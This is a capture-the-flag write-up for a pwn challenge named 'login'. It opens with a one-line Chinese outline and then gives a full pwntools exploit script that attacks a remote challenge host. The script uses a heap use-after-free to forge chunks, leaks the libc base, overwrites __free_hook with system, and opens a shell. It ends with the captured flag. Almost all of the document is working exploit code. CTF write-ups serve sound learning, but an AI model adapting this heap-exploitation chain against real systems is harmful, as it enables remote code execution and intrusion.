# login

UAF -> 控制 bss ->构造伪 chunk ->任意地址写->getshell

```python
from pwn import *
def cmd(c):
	p.sendlineafter(":\n",str(c))
def CMD(c):
	p.sendlineafter(":",str(c))
def login(idx,size,c='n132'):
	cmd(1)
	cmd(idx)
	cmd(size)
	p.sendafter(":\n",c)
def add(idx,size,c="n132"):
	cmd(2)
	cmd(idx)
	cmd(size)
	p.sendafter(":\n",c)
def free(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.sendafter(":\n",c)
def EDIT(idx,c):
	CMD(4)
	CMD(idx)
	p.sendafter(":",c)
#context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p=remote("8sdafgh.gamectf.com",20000)
#p=process('./pwn')
add(0,0x68)
add(1,0x68)
add(4,0x99)
free(0)
free(1)
func=0
got=0x000000000601fd8
puts=0x0000000004006B8
edit(1,p64(0)+p64(0x21)+p64(0)+p64(func)+p64(0xffff)+p64(0x71)+p64(0x601ff5))
add(2,0x68)
add(3,0x68,'\x00'*3+flat(0,0x602010,puts,100,0,0,0,0,0,0x602010))
free(4)
edit(2,flat(0x602010,0,100,0x602070,0,100,0x0000000000602028,0,0x0000000000602010,0x0000000000602060)+'\x20')
edit(0,p64(0xff))
edit(3,p64(0)+p64(0x71)+p64(0)+p64(0x602050))
add(1,0x68)
edit(2,flat(0x602010,0,100,0x602070,0,100,0x0000000000602028,0,0x0000000000602010,0x0000000000602060)+'\x20\x26')
edit(3,flat(0x1800,0,0,0)+'\x00')
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x7ffff7a0d000)
log.warning(hex(base))
libc.address=base

EDIT(2,'/bin/sh\x00'+flat(0,100,0x602070,0,100,0x0000000000602028,0,0x0000000000602010,0x0000000000602060)+p64(libc.sym['__free_hook']))
EDIT(3,p64(libc.sym['system']))

#gdb.attach(p,'b *0x000000000400DAB')

CMD(3)
CMD(2)
p.interactive('n132>')
#flag{0527bcc012587ae2ee0480ac130aa404}
```
